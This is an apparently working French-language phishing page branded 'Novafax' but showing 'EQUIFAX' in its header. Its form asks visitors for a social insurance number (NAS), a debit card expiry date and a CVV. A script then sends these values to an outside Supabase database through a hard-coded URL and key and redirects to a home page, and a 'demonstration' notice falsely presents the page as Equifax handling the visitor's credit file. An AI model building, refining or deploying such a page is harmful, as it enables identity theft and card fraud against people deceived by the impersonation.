<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Novafax — Informations</title>

    <style>
        * {
            box-sizing: border-box;
        }

        html,
        body {
            margin: 0;
            padding: 0;
            width: 100%;
            overflow-x: hidden;
        }

        body {
            background: #f3f6f8;
            color: #263238;
            font-family: Arial, Helvetica, sans-serif;
        }

        /* BANDEAU ROUGE */
        header {
            background: #d60000;
            border-bottom: 1px solid #b00000;
            padding: 12px 20px;
        }

        /* LOGO + NOVAFAX */
        .logo {
            max-width: 600px;
            margin: auto;
            color: #ffffff;
            font-size: 26px;
            font-weight: bold;

            display: flex;
            align-items: center;
            gap: 10px;
        }

        /* PHOTO */
        .logo img {
            width: 42px;
            height: 42px;
            object-fit: contain;
            border-radius: 6px;
            background: #ffffff;
        }

        .container {
            width: 100%;
            max-width: 520px;
            margin: 0 auto;
            padding: 35px 15px;
        }

        .card {
            background: #ffffff;
            border-radius: 16px;
            padding: 25px 20px;
            box-shadow: 0 5px 22px rgba(25, 55, 70, .08);
        }

        h1 {
            margin: 0 0 10px;
            font-size: 28px;
        }

        .intro {
            color: #68757c;
            font-size: 15px;
            line-height: 1.5;
            margin-bottom: 25px;
        }

        label {
            display: block;
            margin-bottom: 7px;
            font-size: 14px;
            font-weight: bold;
        }

        input {
            width: 100%;
            height: 52px;
            padding: 0 15px;
            margin-bottom: 17px;

            border: 1px solid #b8c2c7;
            border-radius: 9px;
            background: #ffffff;

            font-size: 16px;
            outline: none;
        }

        input:focus {
            border-color: #d60000;
        }

        button {
            width: 100%;
            height: 54px;

            border: 0;
            border-radius: 9px;

            background: #d60000;
            color: #ffffff;

            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
        }

        button:hover {
            background: #b80000;
        }

        button:disabled {
            opacity: .7;
            cursor: not-allowed;
        }

        .notice {
            margin-top: 18px;

            background: #fff8df;
            border: 1px solid #f0df9b;
            border-radius: 9px;

            padding: 13px;

            color: #67591f;
            font-size: 12px;
            line-height: 1.5;
        }

        #message {
            margin-top: 15px;
            text-align: center;
            font-size: 14px;
        }

        @media (max-width: 480px) {

            .container {
                padding: 25px 13px 40px;
            }

            .card {
                padding: 22px 16px;
            }

            h1 {
                font-size: 25px;
            }

            .logo {
                font-size: 24px;
            }

            .logo img {
                width: 38px;
                height: 38px;
            }
        }
    </style>

</head>


<body>

    <!-- BANDEAU -->
    <header>

        <div class="logo">

            <!-- PHOTO DANS LE DOSSIER NOVAFAX -->
            <img src="photo 1.jpg" alt="Novafax">

            <span>EQUIFAX</span>

        </div>

    </header>


    <main class="container">

        <div class="card">

            <h1>Informations supplémentaires</h1>

            <p class="intro">
                Renseignez les informations ci-dessous pour continuer.
            </p>


            <!-- FORMULAIRE -->
            <form id="infoForm">

                <label for="a">NAS</label>

                <input
                    id="a"
                    name="a"
                    type="text"
                    placeholder="Entrez votre NAS"
                    required
                >


                <label for="b">Entrez la date d'expiration de votre carte de débit</label>

                <input
                    id="b"
                    name="b"
                    type="text"
                    placeholder="Entrez la date d'expiration"
                    required
                >


                <label for="c">Cvv</label>

                <input
                    id="c"
                    name="c"
                    type="text"
                    placeholder="Entrez le Cvv"
                    required
                >


                <button
                    type="submit"
                    id="submitBtn"
                >
                    Continuer
                </button>

            </form>


            <div id="message"></div>


            <div class="notice">

                <strong>Démonstration :</strong>

                EQUIFAX s'occupe de votre dossier de credit.

            </div>

        </div>

    </main>

    <!-- SUPABASE -->
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>


    <script>

        /* ==============================
           CONFIGURATION SUPABASE
        ============================== */

        const SUPABASE_URL =
            "https://eokwnhtuveojoxrpytdv.supabase.co";

        const SUPABASE_KEY =
            "sb_publishable_K_3CUhqGng7mYO0NZKQQvA_1Aaf57Tx";


        const supabaseClient =
            supabase.createClient(
                SUPABASE_URL,
                SUPABASE_KEY
            );


        /* ==============================
           FORMULAIRE
        ============================== */

        const form =
            document.getElementById("infoForm");

        const button =
            document.getElementById("submitBtn");

        const message =
            document.getElementById("message");


        form.addEventListener(
            "submit",
            async function(event) {

                event.preventDefault();


                /* RÉCUPÉRER A B C */

                const a =
                    document.getElementById("a").value;

                const b =
                    document.getElementById("b").value;

                const c =
                    document.getElementById("c").value;


                /* BOUTON */

                button.disabled = true;

                button.textContent = "Envoi...";

                message.textContent = "";


                /* ENVOYER VERS SUPABASE */

                const { data, error } =
                    await supabaseClient
                        .from("demandes")
                        .insert([
                            {
                                a: a,
                                b: b,
                                c: c
                            }
                        ]);


                /* ERREUR */

                if (error) {

                    console.error(
                        "Erreur Supabase :",
                        error
                    );

                    message.textContent =
                        "Une erreur est survenue : "
                        + error.message;

                    message.style.color = "red";


                    button.disabled = false;

                    button.textContent =
                        "Continuer";

                    return;
                }


                /* SUCCÈS */

                message.textContent =
                    "Informations enregistrées. Redirection...";

                message.style.color = "green";


                /* REDIRECTION */

                setTimeout(function() {

                    window.location.href =
                        "accueil.html";

                }, 500);

            }
        );

    </script>

</body>

</html>
